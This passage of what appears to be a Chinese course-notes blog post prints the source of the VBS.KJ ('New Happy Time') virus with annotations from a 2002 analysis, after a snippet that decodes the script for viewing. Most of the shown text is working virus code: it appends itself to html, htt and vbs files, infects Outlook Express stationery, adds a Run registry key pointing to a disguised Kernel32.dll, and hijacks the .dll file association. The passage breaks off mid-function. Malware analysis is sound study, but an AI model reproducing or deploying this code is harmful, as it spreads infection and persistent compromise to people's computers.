TempChar"</span>&amp;vbCrLf&amp;<span class="string">"Next"</span>)</span></span><br><span class="line"><span class="undefined">'Execute(ThisText)</span></span><br><span class="line"><span class="undefined">msgbox(ThisText)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如下图，插入<code>msgbox</code>可以查看代码</p><p>发现老师给的源码和网上的略有不同</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Computer-Virus/vbs_happytime.png" alt></p><p>以下是来自DanceFire对病毒源码的分析</p><blockquote><p>vbs常识：</p><ul><li><code>Sub func()</code>：是对无返回值函数的声明</li><li><code>function func()</code>：是对有返回值函数的声明</li><li><code>&#39;</code>：以<code>&#39;</code>打头是在vbs的单行注释语句</li><li><code>Exit</code>：后接<code>for</code>、<code>do</code>、<code>function</code>、<code>Sub</code>：指循环或函数的退出，相当于我们C中的循环的break和函数的return</li><li><code>On Error Resume Next</code>：是vbs的错误处理语句，对错误进行提醒，然后继续运行程序</li><li><code>Set objectvar = {objectexpression | New classname | Nothing}</code>：Set语句就是vbs中给变量赋值的语句</li><li><code>[Call] name [argumentlist]</code>： Call语句，正如汇编中的call，用于函数的调用，argumentlist为传入函数的参数</li></ul></blockquote><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#避免执行之</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">' ccor ccor@263.net</span></span><br><span class="line"><span class="comment">' 　发表于 2002-12-1 8:55:25 </span></span><br><span class="line"><span class="comment">'   VBS.KJ[新欢乐时光病毒]源代码分析 </span></span><br><span class="line"><span class="comment">' Virus: VBS.KJ </span></span><br><span class="line"><span class="comment">' Analyze by DanceFire ( DanceFire@263.net ) </span></span><br><span class="line"><span class="comment">' 2002/7/10 </span></span><br><span class="line"><span class="comment">' </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">Dim</span> InWhere,HtmlText,VbsText,DegreeSign,AppleObject,FSO,WsShell,WinPath,SubE,FinalyDisk </span><br><span class="line"></span><br><span class="line"><span class="keyword">Sub</span> KJ_start() </span><br><span class="line">4<span class="comment">' 初始化变量 </span></span><br><span class="line">4KJSetDim() </span><br><span class="line">4<span class="comment">' 初始化环境 </span></span><br><span class="line">4KJCreateMilieu() </span><br><span class="line">4<span class="comment">' 感染本地或者共享上与html所在目录 </span></span><br><span class="line">4KJLikeIt() </span><br><span class="line">4<span class="comment">' 通过vbs感染Outlook邮件模板 </span></span><br><span class="line">4KJCreateMail() </span><br><span class="line">4<span class="comment">' 进行病毒传播 </span></span><br><span class="line">4KJPropagate() </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">' 函数：KJAppendTo(FilePath,TypeStr) </span></span><br><span class="line"><span class="comment">' 功能：向指定类型的指定文件追加病毒 </span></span><br><span class="line"><span class="comment">' 参数： </span></span><br><span class="line"><span class="comment">' FilePath 指定文件路径 </span></span><br><span class="line"><span class="comment">' TypeStr 指定类型 </span></span><br><span class="line"><span class="keyword">Function</span> KJAppendTo(FilePath,TypeStr) </span><br><span class="line"><span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span> </span><br><span class="line"><span class="comment">' 以只读方式打开指定文件 </span></span><br><span class="line"><span class="keyword">Set</span> ReadTemp = FSO.OpenTextFile(FilePath,<span class="number">1</span>) </span><br><span class="line"><span class="comment">' 将文件内容读入到TmpStr变量中 </span></span><br><span class="line">TmpStr = ReadTemp.ReadAll </span><br><span class="line"><span class="comment">' 判断文件中是否存在"KJ_start()"字符串，若存在说明已经感染，退出函数； </span></span><br><span class="line"><span class="comment">' 若文件长度小于1，也退出函数。 </span></span><br><span class="line"><span class="keyword">If</span> <span class="built_in">Instr</span>(TmpStr,<span class="string">"KJ_start()"</span>) &lt;&gt; <span class="number">0</span> <span class="keyword">Or</span> <span class="built_in">Len</span>(TmpStr) &lt; <span class="number">1</span> <span class="keyword">Then</span> </span><br><span class="line">ReadTemp.Close </span><br><span class="line"><span class="keyword">Exit</span> <span class="keyword">Function</span> </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span> </span><br><span class="line"><span class="comment">' 如果传过来的类型是"htt" </span></span><br><span class="line"><span class="comment">' 在文件头加上调用页面的时候加载KJ_start()函数; </span></span><br><span class="line"><span class="comment">' 在文件尾追加html版本的加密病毒体。 </span></span><br><span class="line"><span class="comment">' 如果是"html" </span></span><br><span class="line"><span class="comment">' 在文件尾追加调用页面的时候加载KJ_start()函数和html版本的病毒体; </span></span><br><span class="line"><span class="comment">' 如果是"vbs" </span></span><br><span class="line"><span class="comment">' 在文件尾追加vbs版本的病毒体 </span></span><br><span class="line"><span class="keyword">If</span> TypeStr = <span class="string">"htt"</span> <span class="keyword">Then</span> </span><br><span class="line">ReadTemp.Close </span><br><span class="line"><span class="keyword">Set</span> FileTemp = FSO.OpenTextFile(FilePath,<span class="number">2</span>) </span><br><span class="line">FileTemp.Write <span class="string">"&lt;"</span> &amp; <span class="string">"BODY onload="""</span> &amp; <span class="string">"vbscript:"</span> &amp; <span class="string">"KJ_start()"""</span> &amp; <span class="string">"&gt;"</span> &amp; vbCrLf &amp; TmpStr &amp; vbCrLf &amp; HtmlText </span><br><span class="line">FileTemp.Close </span><br><span class="line"><span class="keyword">Set</span> FAttrib = FSO.GetFile(FilePath) </span><br><span class="line">FAttrib.attributes = <span class="number">34</span> </span><br><span class="line"><span class="keyword">Else</span> </span><br><span class="line">ReadTemp.Close </span><br><span class="line"><span class="keyword">Set</span> FileTemp = FSO.OpenTextFile(FilePath,<span class="number">8</span>) </span><br><span class="line"><span class="keyword">If</span> TypeStr = <span class="string">"html"</span> <span class="keyword">Then</span> </span><br><span class="line">FileTemp.Write vbCrLf &amp; <span class="string">"&lt;"</span> &amp; <span class="string">"HTML&gt;"</span> &amp; vbCrLf &amp; <span class="string">"&lt;"</span> &amp; <span class="string">"BODY onload="""</span> &amp; <span class="string">"vbscript:"</span> &amp; <span class="string">"KJ_start()"""</span> &amp; <span class="string">"&gt;"</span> &amp; vbCrLf &amp; HtmlText </span><br><span class="line"><span class="keyword">ElseIf</span> TypeStr = <span class="string">"vbs"</span> <span class="keyword">Then</span> </span><br><span class="line">FileTemp.Write vbCrLf &amp; VbsText </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span> </span><br><span class="line">FileTemp.Close </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span> </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">' 函数：KJChangeSub(CurrentString,LastIndexChar) </span></span><br><span class="line"><span class="comment">' 功能：改变子目录以及盘符 </span></span><br><span class="line"><span class="comment">' 参数： </span></span><br><span class="line"><span class="comment">' CurrentString 当前目录 </span></span><br><span class="line"><span class="comment">' LastIndexChar 上一级目录在当前路径中的位置 </span></span><br><span class="line"><span class="keyword">Function</span> KJChangeSub(CurrentString,LastIndexChar) </span><br><span class="line"><span class="comment">' 判断是否是根目录 </span></span><br><span class="line"><span class="keyword">If</span> LastIndexChar = <span class="number">0</span> <span class="keyword">Then</span> </span><br><span class="line"><span class="comment">' 如果是根目录 </span></span><br><span class="line"><span class="comment">' 如果是C:\，返回FinalyDisk盘，并将SubE置为0， </span></span><br><span class="line"><span class="comment">' 如果不是C:\，返回将当前盘符递减1，并将SubE置为0 </span></span><br><span class="line"><span class="keyword">If</span> <span class="built_in">Left</span>(<span class="built_in">LCase</span>(CurrentString),<span class="number">1</span>) =&lt; <span class="built_in">LCase</span>(<span class="string">"c"</span>) <span class="keyword">Then</span> </span><br><span class="line">KJChangeSub = FinalyDisk &amp; <span class="string">":\"</span> </span><br><span class="line">SubE = <span class="number">0</span> </span><br><span class="line"><span class="keyword">Else</span> </span><br><span class="line">KJChangeSub = <span class="built_in">Chr</span>(<span class="built_in">Asc</span>(<span class="built_in">Left</span>(<span class="built_in">LCase</span>(CurrentString),<span class="number">1</span>)) - <span class="number">1</span>) &amp; <span class="string">":\"</span> </span><br><span class="line">SubE = <span class="number">0</span> </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span> </span><br><span class="line"><span class="keyword">Else</span> </span><br><span class="line"><span class="comment">' 如果不是根目录，则返回上一级目录名称 </span></span><br><span class="line">KJChangeSub = <span class="built_in">Mid</span>(CurrentString,<span class="number">1</span>,LastIndexChar) </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span> </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">' 函数：KJCreateMail() </span></span><br><span class="line"><span class="comment">' 功能：感染邮件部分 </span></span><br><span class="line"><span class="keyword">Function</span> KJCreateMail() </span><br><span class="line"><span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span> </span><br><span class="line"><span class="comment">' 如果当前执行文件是"html"的，就退出函数 </span></span><br><span class="line"><span class="keyword">If</span> InWhere = <span class="string">"html"</span> <span class="keyword">Then</span> </span><br><span class="line"><span class="keyword">Exit</span> <span class="keyword">Function</span> </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span> </span><br><span class="line"><span class="comment">' 取系统盘的空白页的路径 </span></span><br><span class="line">ShareFile = <span class="built_in">Left</span>(WinPath,<span class="number">3</span>) &amp; <span class="string">"Program Files\Common Files\Microsoft Shared\Stationery\blank.htm"</span> </span><br><span class="line"><span class="comment">' 如果存在这个文件，就向其追加html的病毒体 </span></span><br><span class="line"><span class="comment">' 否则生成含有病毒体的这个文件 </span></span><br><span class="line"><span class="keyword">If</span> (FSO.FileExists(ShareFile)) <span class="keyword">Then</span> </span><br><span class="line"><span class="keyword">Call</span> KJAppendTo(ShareFile,<span class="string">"html"</span>) </span><br><span class="line"><span class="keyword">Else</span> </span><br><span class="line"><span class="keyword">Set</span> FileTemp = FSO.OpenTextFile(ShareFile,<span class="number">2</span>,<span class="literal">true</span>) </span><br><span class="line">FileTemp.Write <span class="string">"&lt;"</span> &amp; <span class="string">"HTML&gt;"</span> &amp; vbCrLf &amp; <span class="string">"&lt;"</span> &amp; <span class="string">"BODY onload="""</span> &amp; <span class="string">"vbscript:"</span> &amp; <span class="string">"KJ_start()"""</span> &amp; <span class="string">"&gt;"</span> &amp; vbCrLf &amp; HtmlText </span><br><span class="line">FileTemp.Close </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span> </span><br><span class="line"><span class="comment">' 取得当前用户的ID和OutLook的版本 </span></span><br><span class="line">DefaultId = WsShell.RegRead(<span class="string">"HKEY_CURRENT_USER\Identities\Default User ID"</span>) </span><br><span class="line">OutLookVersion = WsShell.RegRead(<span class="string">"HKEY_LOCAL_MACHINE\Software\Microsoft\Outlook Express\MediaVer"</span>) </span><br><span class="line"><span class="comment">' 激活信纸功能，并感染所有信纸 </span></span><br><span class="line">WsShell.RegWrite <span class="string">"HKEY_CURRENT_USER\Identities\"</span>&amp;DefaultId&amp;<span class="string">"\Software\Microsoft\Outlook Express\"</span>&amp; <span class="built_in">Left</span>(OutLookVersion,<span class="number">1</span>) &amp;<span class="string">".0\Mail\Compose Use Stationery"</span>,<span class="number">1</span>,<span class="string">"REG_DWORD"</span> </span><br><span class="line"><span class="keyword">Call</span> KJMailReg(<span class="string">"HKEY_CURRENT_USER\Identities\"</span>&amp;DefaultId&amp;<span class="string">"\Software\Microsoft\Outlook Express\"</span>&amp; <span class="built_in">Left</span>(OutLookVersion,<span class="number">1</span>) &amp;<span class="string">".0\Mail\Stationery Name"</span>,ShareFile) </span><br><span class="line"><span class="keyword">Call</span> KJMailReg(<span class="string">"HKEY_CURRENT_USER\Identities\"</span>&amp;DefaultId&amp;<span class="string">"\Software\Microsoft\Outlook Express\"</span>&amp; <span class="built_in">Left</span>(OutLookVersion,<span class="number">1</span>) &amp;<span class="string">".0\Mail\Wide Stationery Name"</span>,ShareFile) </span><br><span class="line">WsShell.RegWrite <span class="string">"HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Outlook\Options\Mail\EditorPreference"</span>,<span class="number">131072</span>,<span class="string">"REG_DWORD"</span> </span><br><span class="line"><span class="keyword">Call</span> KJMailReg(<span class="string">"HKEY_CURRENT_USER\Software\Microsoft\Windows Messaging Subsystem\Profiles\Microsoft Outlook Internet Settings\0a0d020000000000c000000000000046\001e0360"</span>,<span class="string">"blank"</span>) </span><br><span class="line"><span class="keyword">Call</span> KJMailReg(<span class="string">"HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Microsoft Outlook Internet Settings\0a0d020000000000c000000000000046\001e0360"</span>,<span class="string">"blank"</span>) </span><br><span class="line">WsShell.RegWrite <span class="string">"HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Outlook\Options\Mail\EditorPreference"</span>,<span class="number">131072</span>,<span class="string">"REG_DWORD"</span> </span><br><span class="line"><span class="keyword">Call</span> KJMailReg(<span class="string">"HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Common\MailSettings\NewStationery"</span>,<span class="string">"blank"</span>) </span><br><span class="line">KJummageFolder(<span class="built_in">Left</span>(WinPath,<span class="number">3</span>) &amp; <span class="string">"Program Files\Common Files\Microsoft Shared\Stationery"</span>) </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">' 函数:KJCreateMilieu() </span></span><br><span class="line"><span class="comment">' 功能：创建系统环境 </span></span><br><span class="line"><span class="keyword">Function</span> KJCreateMilieu() </span><br><span class="line"><span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span> </span><br><span class="line">TempPath = <span class="string">""</span> </span><br><span class="line"><span class="comment">' 判断操作系统是NT/2000还是9X </span></span><br><span class="line"><span class="keyword">If</span> <span class="keyword">Not</span>(FSO.FileExists(WinPath &amp; <span class="string">"WScript.exe"</span>)) <span class="keyword">Then</span> </span><br><span class="line">TempPath = <span class="string">"system32\"</span> </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span> </span><br><span class="line"><span class="comment">' 为了文件名起到迷惑性，并且不会与系统文件冲突。 </span></span><br><span class="line"><span class="comment">' 如果是NT/2000则启动文件为system\Kernel32.dll </span></span><br><span class="line"><span class="comment">' 如果是9x启动文件则为system\Kernel.dll </span></span><br><span class="line"><span class="keyword">If</span> TempPath = <span class="string">"system32\"</span> <span class="keyword">Then</span> </span><br><span class="line">StartUpFile = WinPath &amp; <span class="string">"SYSTEM\Kernel32.dll"</span> </span><br><span class="line"><span class="keyword">Else</span> </span><br><span class="line">StartUpFile = WinPath &amp; <span class="string">"SYSTEM\Kernel.dll"</span> </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span> </span><br><span class="line"><span class="comment">' 添加Run值，添加刚才生成的启动文件路径 </span></span><br><span class="line">WsShell.RegWrite <span class="string">"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Kernel32"</span>,StartUpFile </span><br><span class="line"><span class="comment">' 拷贝前期备份的文件到原来的目录 </span></span><br><span class="line">FSO.CopyFile WinPath &amp; <span class="string">"web\kjwall.gif"</span>,WinPath &amp; <span class="string">"web\Folder.htt"</span> </span><br><span class="line">FSO.CopyFile WinPath &amp; <span class="string">"system32\kjwall.gif"</span>,WinPath &amp; <span class="string">"system32\desktop.ini"</span> </span><br><span class="line"><span class="comment">' 向%windir%\web\Folder.htt追加病毒体 </span></span><br><span class="line"><span class="keyword">Call</span> KJAppendTo(WinPath &amp; <span class="string">"web\Folder.htt"</span>,<span class="string">"htt"</span>) </span><br><span class="line"><span class="comment">' 改变dll的MIME头 </span></span><br><span class="line"><span class="comment">' 改变dll的默认图标 </span></span><br><span class="line"><span class="comment">' 改变dll的打开方式 </span></span><br><span class="line">WsShell.RegWrite <span class="string">"HKEY_CLASSES_ROOT\.dll\"</span>,<span class="string">"dllfile"</span> </span><br><span class="line">WsShell.RegWrite <span class="string">"HKEY_CLASSES_ROOT\.dll\Content Type"</span>,<span class="string">"application/x-msdownload"</span> </span><br><span class="line">WsShell.RegWrite <span class="string">"HKEY_CLASSES_ROOT\dllfile\DefaultIcon\"</span>,WsShell.RegRead(<span class="string">"HKEY_CLASSES_ROOT\vxdfile\DefaultIcon\"</span>) </span><br><span class="line">WsShell.RegWrite <span class="string">"HKEY_CLASSES_ROOT\dllfile\ScriptEngine\"</span>,<span class="string">"VBScript"</span> </span><br><span class="line">WsShell.RegWrite <span class="string">"HKEY_CLASSES_ROOT\dllFile\Shell\Open\Command\"</span>,WinPath &amp; TempPath &amp; <span class="string">"WScript.exe ""%1"" %*"</span> </span><br><span class="line">WsShell.RegWrite <span class="string">"HKEY_CLASSES_ROOT\dllFile\ShellEx\PropertySheetHandlers\WSHProps\"</span>,<span class="string">"&#123;60254CA5-953B-11CF-8C96-00AA00B8708C&#125;"</span> </span><br><span class="line">WsShell.RegWrite <span class="string">"HKEY_CLASSES_ROOT\dllFile\ScriptHostEncode\"</span>,<span class="string">"&#123;85131631-480C-11D2-B1F9-00C04F86C324&#125;"</span> </span><br><span class="line"><span class="comment">' 启动时加载的病毒文件中写入病毒体 </span></span><br><span class="line"><span class="keyword">Set</span> FileTemp = FSO.OpenTextFile(StartUpFile,<span class="number">2</span>,<span class="literal">true</span>) </span><br><span class="line">FileTemp.Write VbsText </span><br><span class="line">FileTemp.Close </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">' 函数：KJLikeIt() </span></span><br><span class="line"><span class="comment">' 功能：针对html文件进行处理，如果访问的是本地的或者共享上的文件，将感染这个目录 </span></span><br><span class="line"><span class="keyword">Function</span> KJLikeIt() </span><br><span class="line"><span class="comment">' 如果当前执行文件不是"html"的就退出程序 </span></span><br><span class="line"><span class="keyword">If</span> InWhere &lt;&gt; <span class="string">"html"</span> <span class="keyword">Then</span> </span><br><span class="line"><span class="keyword">Exit</span> <span class="keyword">Function</span> </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span> </span><br><span class="line"><span class="comment">' 取得文档当前路径 </span></span><br><span class="line">ThisLocation = document.location </span><br><span class="line"><span class="comment">' 如果是本地或网上共享文件 </span></span><br><span class="line"><span class="keyword">If</span> <span class="built_in">Left</span>(ThisLocation, <span class="number">4</span>) = <span class="string">"file"</span> <span class="keyword">Then</span> </span><br><span class="line">ThisLocation = <span class="built_in">Mid</span>(ThisLocation,<span class="number">9</span>) </span><br><span class="line"><span class="comment">' 如果这个文件扩展名不为空，在ThisLocation中保存它的路径 </span></span><br><span class="line"><span class="keyword">If</span> FSO.GetExtensionName(ThisLocation) &lt;&gt; <span class="string">""</span> <span class="keyword">then</span> </span><br><span class="line">ThisLocation = <span class="built_in">Left</span>(ThisLocation,<span class="built_in">Len</span>(ThisLocation) - <span class="built_in">Len</span>(FSO.GetFileName(ThisLocation))) </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span> </span><br><span class="line"><span class="comment">' 如果ThisLocation的长度大于3就尾追一个"\" </span></span><br><span class="line"><span class="keyword">If</span> <span class="built_in">Len</span>(ThisLocation) &gt; <span class="number">3</span> <span class="keyword">Then</span> </span><br><span class="line">ThisLocation = ThisLocation &amp; <span class="string">"\"</span> </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span> </span><br><span class="line"><span class="comment">' 感染这个目录 </span></span><br><span class="line">KJummageFolder(ThisLocation) </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span> </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">' 函数：KJMailReg(RegStr,FileName) </span></span><br><span class="line"><span class="comment">' 功能：如果注册表指定键值不存在，则向指定位置写入指定文件名 </span></span><br><span class="line"><span class="comment">' 参数： </span></span><br><span class="line"><span class="comment">' RegStr 注册表指定键值 </span></span><br><span class="line"><span class="comment">' FileName 指定文件名 </span></span><br><span class="line"><span class="keyword">Function</span> KJMailReg(RegStr,FileName) </span><br><span class="line"><span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span> </span><br><span class="line"><span class="comment">' 如果注册表指定键值不存在，则向指定位置写入指定文件名 </span></span><br><span class="line">RegTempStr = WsShell.RegRead(RegStr) </span><br><span 